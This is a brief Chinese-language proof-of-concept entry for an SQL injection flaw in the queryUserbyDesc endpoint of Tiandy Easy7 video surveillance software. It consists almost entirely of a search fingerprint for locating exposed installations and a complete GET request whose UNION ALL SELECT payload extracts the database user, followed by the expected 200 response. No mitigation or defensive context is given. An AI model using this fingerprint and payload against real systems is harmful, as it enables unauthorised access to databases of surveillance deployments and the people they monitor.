# 天地伟业Easy7queryUserbyDesc存在SQL注入漏洞

天地伟业 ｜ SQL注入 ｜ —
- **指纹**：`app="Tiandy-Easy7"`
- **请求**：`GET /Easy7/rest/user/queryUserbyDesc?userDesc=1'+UNION+ALL+SELECT+CONCAT(0x7e,USER(),0x7e),41,41--+- HTTP/1.1`
- **响应特征**：200